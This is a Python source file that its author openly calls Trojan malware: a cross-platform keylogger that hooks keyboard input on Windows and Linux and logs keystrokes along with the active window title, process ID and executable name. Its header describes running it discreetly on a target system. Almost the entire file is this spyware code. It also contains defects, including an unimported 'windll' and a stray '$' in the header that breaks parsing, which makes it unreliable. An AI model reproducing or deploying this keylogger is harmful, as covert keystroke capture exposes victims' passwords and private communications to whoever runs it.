#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 5th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script implements a cross-platform keylogger capable of logging keyboard inputs on both Windows
# and Linux operating systems. It utilizes different libraries and modules depending on the platform, 
# using pyHook for Windows and pynput for Linux. The script continuously monitors keyboard events, 
# logging all key inputs, including printable characters and special keys, while also identifying 
# the active window or process where the input is directed. To use the script, simply run it on the 
# target system, and it will start logging keystrokes in the background. An example usage scenario 
# would involve running the script discreetly on a system to monitor user activity for security or 
# administrative purposes. The script output includes the logged keys along with details such as 
$# the process ID, executable name, and window title where the input occurred. For instance, 
# the output might display characters typed in a text editor along with information about 
# the editor's process and window title, providing context for the logged keystrokes.
#################################################################################################
import platform
import os
import time
from ctypes import byref, create_string_buffer, c_ulong

# Check the current operating system
if platform.system() == "Windows":
    # Import required modules for Windows
    import win32clipboard
    import win32gui
    import win32process
    import psutil
    import pyHook
    import pythoncom
else:
    # Import required module for Linux
    from pynput.keyboard import Listener

# Define a constant for the timeout period
TIMEOUT = 60*10

# Define the KeyLogger class
class KeyLogger:
    # Initialize the KeyLogger class
    def __init__(self):
        # Initialize the current_window attribute
        self.current_window = None

    # Method to get the current process running in the foreground window
    def get_current_process(self, hwnd):
        # Get the process ID of the window
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = pid.value

        # Get the name of the executable file for the process
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, process_id)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # Get the title of the current window
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            # Decode and store the window title
            self.current_window = window_title.value.decode()
        except UnicodeError as e:
            # Print an error message if decoding fails
            print(f'{e}: window name unknown')

        # Print the process ID, executable name, and window title
        print('\n', process_id, executable.value.decode(), self.current_window)

        # Close handles
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # Method to handle keyboard events (Windows)
    def on_keyboard_event(self, event):
        # Check if the window has changed
        if event.Window != self.current_window:
            # Get information about the current process
            self.get_current_process(event.Window)
        # Print the pressed key (as a character)
        print(chr(event.Ascii))

    # Method to start the keylogger on Windows
    def start_windows_keylogger(self):
        # Create a HookManager instance
        hook_manager = pyHook.HookManager()
        # Set the KeyDown event handler
        hook_manager.KeyDown = self.on_keyboard_event
        # Install the keyboard hook
        hook_manager.HookKeyboard()
        # Start the message loop
        pythoncom.PumpMessages()

    # Method to handle key press events (Linux)
    def on_press(self, key):
        try:
            # Print the pressed key (as a character)
            print(key.char)
        except AttributeError:
            # Print the pressed key (as a special key)
            print(key)

    # Method to handle key release events (Linux)
    def on_release(self, key):
        # Check if the key '5' is pressed to exit the program
        if key == '5':
            return False

    # Method to start the keylogger on Linux
    def start_linux_keylogger(self):
        # Create a Listener instance
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            # Start listening for key events
            listener.join()

    # Method to start the keylogger based on the current operating system
    def start_keylogger(self):
        # Check the current operating system
        if platform.system() == "Windows":
            # Start the keylogger on Windows
            self.start_windows_keylogger()
        else:
            # Start the keylogger on Linux
            self.start_linux_keylogger()

# Entry point of the script
if __name__ == "__main__":
    # Create an instance of the KeyLogger class
    keylogger = KeyLogger()
    # Start the keylogger
    keylogger.start_keylogger()
